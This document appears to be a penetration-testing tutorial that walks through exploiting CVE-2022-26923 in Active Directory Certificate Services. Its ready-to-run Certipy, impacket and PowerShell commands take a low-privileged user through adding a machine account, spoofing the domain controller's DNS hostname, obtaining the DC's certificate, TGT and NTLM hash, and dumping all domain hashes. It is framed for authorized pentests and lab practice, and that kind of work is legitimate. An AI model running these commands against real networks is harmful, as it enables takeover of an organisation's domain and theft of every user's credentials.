# Active Directory Certificate Services (ADCS) CVE-2022-26923

This attack relies on ADCS being available within the internal active directory network you are attempting to compromise. Furthermore, a low privieged domain user account will be required for the steps in the attack path.

TryHackMe has a room based on this vulnerability that can be accessed here https://tryhackme.com/room/cve202226923. I'd recommend practicing within their environment _before_ using this on a penetest engagement.

With the low privileged user credentials, search for the ADCS server within the active directory domain. This can be done by running `certutil.exe` within Microsoft Windows, or by using `Certipy.py`, which is available from https://github.com/ly4k/Certipy. Certipy requires Python 3 and also impacket to be installed. If this attack is ran from a Kali Linux machine attached to the network, the dependencies should come preinstalled.

*Note that ADCS does not have to be running on the domain controller, and quite often it will be ran on its own server instance*

Use certipy to discover the details of the ADCS server within the domain. The following command will list the details of the Certificate Authority "CA" within the AD environment, along with what certificate templates are available:

```shell
certipy.py find 'domain.local/username:password@dc1.adcs-server.domain.local'
```

Furthermore, if you have bloodhound output for the current domain, the following query can be used to list all certificate templates:

```
MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.Enabled = TRUE RETURN n
```

Now a certificate can be generated for the current user using Certipy and the "User" template. This will then download a ".pfx" certificate file. The name of the CA can be found from the output of the `Certipy.py find` command or `certutil.exe`

```shell
certipy.py req 'domain.local/username:password@dc1.adcs-server.domain.local' -ca "Name Of CA" -template user
```

Now a TGT can be obtained for the user using Certipy. The following command will generate a CCACHE file containing a Kerberos TGT for the user "username". THe command will output the CCACHE file, along with the NTLM hash for the user.

```shell
certipy.py auth -pfx username.pfx
```

Now impacket can be used to add a new computer object to the active directory domain. In a default active directory configuration, a standard user can add up to 10 machine accounts. Providing the user can add a machine account to the domain, `addcomputer.py` can be used:

```shell
addcomputer.py 'domain.local/username:password' -method LDAPS -computer-name NEW-PC -computer-password Password123!`
```

Now with the new computer added to the domain, a machine certificate can be requested from the ADCS server:

```shell
certipy.py req 'domain.local/NEW-PC$:Password123!@dc1.adcs-server.domain.local' -ca "Name Of CA" -template Machine'
```

The certificate will download as a ".pfx" file with the `NEW-PC.pfx`. Now a TGT can be created for the machine account, which will output a CCACHE file:

```shell
certipy auth -pfx NEW-PC.pfx
```

On a Windows host on the target environment, the following commands can now be ran in powershell to make modifications to the DNS hostname. First look at the dnshostname and service princlpal name:

```powershell
Get-ADComputer NEW-PC -properties dnshostname,serviceprincipalname
```

First, delete the serviceprincipalname using the following powershell command:

```powershell
Set-ADComputer NEW-PC -ServicePrincipalName @{}
```

Rename the DNS hostname to a hostname that belongs to the domain controller within the environment:

```powershell
Set-ADComputer NEW-PC -DnsHostName DC1.domain.local
```

Now certipy can be ran again to request a certificate for the same machine again, noting that the SPN has been removed and the DNS host name now matches that of a domain controller within the environment:

```shell
certipy.py req 'domain.local/NEW-PC$:Password123!@dc1.adcs-server.domain.local' -ca "Name Of CA" -template Machine'
```
The certificate output will contain the same properties of the domain controller. A TGT can now be created using certipy, and will save the output as `DC1.domain.local.CCACHE`. Furthermore, the output will contain the NTLM hash of DC1$ machine account:

```shell
certipy.py auth -pfx DC1.pfx
```

With the NTLM and TGT to authenticate as DC1$, it would be possible to use Impackets secretsdump.py tool to dump all hashes from the domain, either by supplying the CCACHE file as the `export KRB5CCACHE=DC1.ccache` and selecting kerberos authentication, or just by supplying the NTLM hash of the machine account.



